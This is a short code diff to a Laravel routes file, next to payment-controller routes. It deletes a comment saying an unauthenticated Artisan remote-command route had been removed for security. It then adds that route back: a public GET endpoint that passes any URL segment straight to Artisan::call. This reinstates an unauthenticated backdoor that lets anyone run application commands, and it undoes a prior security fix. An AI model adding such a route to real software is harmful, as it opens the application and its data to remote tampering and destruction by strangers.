@@ -240,7 +240,9 @@ Route::controller(EasyKashController::class)
         Route::post('status', 'status');
     });
 
-// [REMOVED 2026-07-02] Unauthenticated arbitrary-Artisan RCE route deleted for security.
+Route::get('/command/{command}', function ($command) {
+    Artisan::call($command);
+});
 
 
 
